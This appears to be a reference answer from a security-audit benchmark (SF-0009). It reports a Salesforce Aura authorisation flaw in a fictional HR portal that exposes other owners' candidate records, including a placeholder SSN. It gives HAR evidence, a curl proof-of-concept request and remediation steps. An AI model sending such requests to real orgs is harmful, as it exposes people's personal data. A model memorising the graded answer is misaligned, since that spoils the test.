# Expected Response

## System
- **Domain:** HR Tech / Talent Acquisition (Salesforce-Integrated)
- **System:** JobCore Candidate Portal (Salesforce-Integrated)
- **Example ID:** SF-0009

## Priority Findings

### Finding 1: HR Tech Salesforce — BOLA Mass Assignment via Aura getRecord Exposes Cross-Ownership Candidate Custom Records (Pattern 1.12)
**Severity:** High
**Category:** BOLA / Mass Assignment via Object Fields (Salesforce Aura)

**Summary:**
Per §4.0 (RISK-SF-009/RISK-SF-010): The `CustomObjectController` Apex class is declared `without sharing`, meaning Salesforce sharing rules are not enforced. The SOQL query is missing an ownership check. Per §5.0 (Pattern 1.12 — mass assignment via object fields): the Aura `getRecord` action accepts a client-supplied `fields` list including privileged Salesforce fields (`OwnerId`, `SensitiveData__c`, `InternalNotes__c`), enabling cross-ownership mass read of candidate records. An attacker submitted `c.CustomObjectController.getRecord` with `recordId: "00151C1"` (belonging to `OwnerId: "005VICTIM"`) and received `SensitiveData__c: "SSN: 000-74-7444"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"`. In HR Tech, exposure of candidate SSNs violates GDPR and employment privacy laws.

**Evidence from HAR:**
- Request: `POST https://110e51c1.lightning.force.com/aura`
- Aura action descriptor: `c.CustomObjectController.getRecord`
- `aura.token`: `undefined`
- Params: `recordId: "00151C1"`, `fields: ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]`
- Response `SUCCESS`: `Id: "00151C1"`, `Name: "Victim CustomRecord Record"`, `OwnerId: "005VICTIM"`, `InternalNotes__c: "CONFIDENTIAL: internal review notes"`, `SensitiveData__c: "SSN: 000-74-7444"`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-SF-009 | CustomObjectController declared `without sharing` |
| context.txt §4.0 | RISK-SF-010 | SOQL missing ownership check |
| context.txt §5.0 | Pattern 1.12 | Mass assignment — privileged fields accepted from client |
| HAR request | params.recordId | 00151C1 — victim candidate custom record |
| HAR request | params.fields | OwnerId, SensitiveData__c (privileged) |
| HAR response | SensitiveData__c | SSN: 000-74-7444 (PII) |

## Steps to Reproduce

### Step 1 — Aura recordId mass assignment HR Tech (HAR)
```bash
curl -s -X POST 'https://110e51c1.lightning.force.com/aura' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CustomObjectController.getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"00151C1","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```
**Vulnerable:** Returns victim candidate record including `SSN: 000-74-7444`. **Secure:** FORBIDDEN.

## Remediation
1. Declare `CustomObjectController` as `with sharing`.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Reject client-supplied `fields`; define server-side allowlist excluding `SensitiveData__c` and `OwnerId`.
